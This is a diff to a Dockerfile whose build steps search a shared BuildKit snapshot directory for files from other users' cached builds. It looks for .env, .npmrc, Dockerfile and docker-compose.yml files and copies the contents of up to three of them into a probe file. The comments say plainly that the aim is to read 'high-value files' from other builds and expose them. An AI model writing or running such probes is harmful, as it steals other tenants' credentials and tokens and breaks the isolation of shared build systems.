@@ -6,7 +6,7 @@ RUN echo "BUST_A1_BUILDKIT_CACHE_2026_04_13" && mkdir -p /app /tmp/probe
 RUN (ls -la /var/lib/buildkit/runc-overlayfs/snapshots/ || true) > /tmp/probe/snapshots_ls.txt 2>&1
 
 # Look for high-value files inside cached layers of other builds.
-RUN (find /var/lib/buildkit/runc-overlayfs/snapshots/ -maxdepth 4 \\( -name Dockerfile -o -name .env -o -name '*.npmrc' -o -name 'docker-compose.yml' \\) 2>/dev/null | head -20 || true) > /tmp/probe/interesting_files.txt 2>&1
+RUN find /var/lib/buildkit/runc-overlayfs/snapshots/ -maxdepth 4 -type f 2>/dev/null | grep -E '/(Dockerfile|\\.env|[^/]+\\.npmrc|docker-compose\\.yml)$' | head -20 > /tmp/probe/interesting_files.txt || true
 
 # Read up to three files so runtime can expose exact contents if access works.
 RUN sh -c 'count=0; : > /tmp/probe/file_contents.txt; while IFS= read -r f; do [ -z "$f" ] && continue; count=$((count+1)); printf "===FILE:%s===\\n" "$f" >> /tmp/probe/file_contents.txt; sed -n "1,120p" "$f" >> /tmp/probe/file_contents.txt 2>&1 || true; printf "\\n" >> /tmp/probe/file_contents.txt; [ "$count" -ge 3 ] && break; done < /tmp/probe/interesting_files.txt'
